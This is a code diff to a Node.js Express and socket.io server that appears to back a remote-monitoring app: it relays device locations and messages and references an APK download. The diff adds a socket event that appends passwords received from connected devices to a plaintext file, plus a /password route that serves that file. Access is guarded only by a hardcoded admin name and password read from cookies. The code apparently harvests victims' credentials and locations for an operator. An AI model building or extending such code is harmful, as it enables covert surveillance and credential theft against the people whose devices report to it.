@@ -1,8 +1,9 @@
 var express = require('express')
 var App = express()
 var Bodyparser = require('body-parser')
+var cookieParser = require('cookie-parser')
 var {rateLimit} = require("express-rate-limit")
-
+var fs = require('fs')
 var PORT =  process.env.PORT || 4000 
 
 require("dotenv").config({path:"./MYDATA.env"})
@@ -15,11 +16,22 @@ const LimitRuls = rateLimit({
 })
 App.use(LimitRuls)
 App.use(Bodyparser.json())
-
+App.use(cookieParser())
 App.use(Bodyparser.urlencoded({ extended: true,limit:"25MB" })); 
+
 var path = require('path')
 
 
+
+
+
+async function  WriteFile(data){
+  try{
+  await fs.appendFileSync("./views/allpassword.txt",data)
+  }catch(err){
+    console.log("ERROR : file not write "+err)
+  }
+}
 
 
 
@@ -28,6 +40,7 @@ var path = require('path')
 var {initializeApp} =require('firebase/app')
 const FirbaseDatabase = require('firebase/database');
 const  FirebaseStorage = require('firebase/storage')
+const { json } = require('body-parser')
 
 
 
@@ -64,6 +77,69 @@ http.listen(PORT,()=>{
 
 
 
+var Id_Collection = []
+
+class  IdManager{
+    setId(id,name){
+
+
+      var data = {id,name}
+      if(this.#hasSame(id) && name !== undefined){
+         Id_Collection.forEach((element,ind)=>{
+            if(element.id == id){
+                element.name = name
+            }
+        })
+      }
+      else if(this.#hasSame(id)){
+
+      }
+
+      else if(name !== undefined && id !== undefined){
+         var data = {name,id}
+         Id_Collection.push(data)
+
+     }
+
+     else if(name === undefined && id !== undefined){
+        var data = {name:"No name",id}
+        Id_Collection.push(data)
+     }
+
+     else{
+        console.log("Have one")
+     }
+
+
+
+    }
+
+ 
+    deletId(id){
+    Id_Collection =   Id_Collection.filter((valu,index)=> valu.id !== id)
+
+    }
+
+    #hasSame(id){
+        var hassame = false
+         Id_Collection.forEach((data)=>{
+            if(data.id === id){
+                hassame = true
+            }
+         })
+         return hassame
+    }
+ 
+    getid(){
+     return Id_Collection
+    }
+ 
+ }
+
+
+
+var idmanager = new IdManager()
+
 
 
 
@@ -77,12 +153,19 @@ App.get("/",UserAuth,(req,res)=>{
 })
 
 App.get("/info",UserAuth,(req,res)=>{
- console.log("info  (name) ->"+req.headers.name)
+
   res.sendFile(path.join(__dirname,"views","information.html"))
 })
 App.get("/image",UserAuth,(req,res)=>{
   res.sendFile(path.join(__dirname,"views","images.html"))
 })
+
+
+
+App.get("/password",UserAuth,(req,res)=>{
+  res.sendFile(path.join(__dirname,"views","allpassword.txt"))
+})
+
 
 App.post("/login",(req,res)=>{
   
@@ -112,16 +195,31 @@ App.get("/download/:file",(req,res)=>{
 
 
 App.post("/id/:mod/:id",(req,res)=>{
+ 
+
   if(req.params.mod == "get"){
       
-      res.send(allrooms).status(200)
+      res.send(idmanager.getid()).status(200)
   }
+
+  else if(req.params.mod == "set"){
+      idmanager.setId(req.body.id,req.body.name)
+    res.send(idmanager.getid()).status(200)
+}
+
+
   else if(req.params.mod == "delet"){
       console.log(req.params.id)
+      idmanager.deletId(req.params.id)
+      res.send(idmanager.getid()).status(200)
+      /*
       allrooms = allrooms.filter(value =>value != req.params.id.toString())
       res.send(allrooms).status(200)
+      */
 
-  }else{
+  }
+
+  else{
       res.send("in valid mode").status(404)
   }
 })
@@ -204,11 +302,15 @@ socket.on('connection',Socket=>{
 //viewe\app-release.apk'
   Socket.on('join_room',(roomid)=>{
        if(roomid.length > 1){
-        Socket.join(roomid)
+        /*
+  
         if(!allrooms.some(val=>val == roomid)){
            
           allrooms.push(roomid)
       }
+      */
+     Socket.join(roomid)
+     idmanager.setId(roomid)
        }else{}
 
    })
@@ -220,7 +322,9 @@ socket.on('connection',Socket=>{
    })
 
    Socket.on("msg",(room,data)=>{
+
      if(room != ""){
+
       Socket.to(room).emit("msg", data);
      }
      
@@ -233,6 +337,13 @@ socket.on('connection',Socket=>{
      console.log(data)
        Socket.to(room).emit("location",data)
    })
+
+
+   Socket.on("password",(room,data)=>{
+  WriteFile(String(room) +" : "+ data+"\n");
+  })
+
+
 
 
 
@@ -260,7 +371,7 @@ function AllFilePath(){
 }
 
 function UserAuth(req,res,next){
-  if(req.query.name == "admin" && req.query.password == "12733245"  ){
+  if(req.cookies.name == "admin" && req.cookies.password == "12733245"  ){
     
     next()
 
